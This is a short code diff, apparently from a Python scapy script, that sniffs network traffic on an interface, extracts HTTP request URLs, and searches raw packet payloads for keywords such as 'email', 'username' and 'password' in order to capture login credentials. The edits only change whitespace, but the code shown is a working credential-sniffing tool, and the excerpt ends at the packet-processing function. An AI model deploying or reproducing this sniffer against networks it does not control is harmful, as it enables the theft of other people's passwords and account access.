@@ -3,23 +3,27 @@ import time
 import scapy.all as scapy
 from scapy.layers import http
 
+
 # using scapy function to sniff with callback function
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
+
 # accessing http layer to layer
 def get_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
 
 # checking if packet has any email/password information to sniff it
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
         # arguemnts key name list to check if it's in packet
-        keywords = ['email', 'username', 'user', 'login', 'password', 'pass','uname']
+        keywords = ['email', 'username', 'user', 'login', 'password', 'pass', 'uname']
         for keyword in keywords:
             if keyword in load.decode():
                 return load
+
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
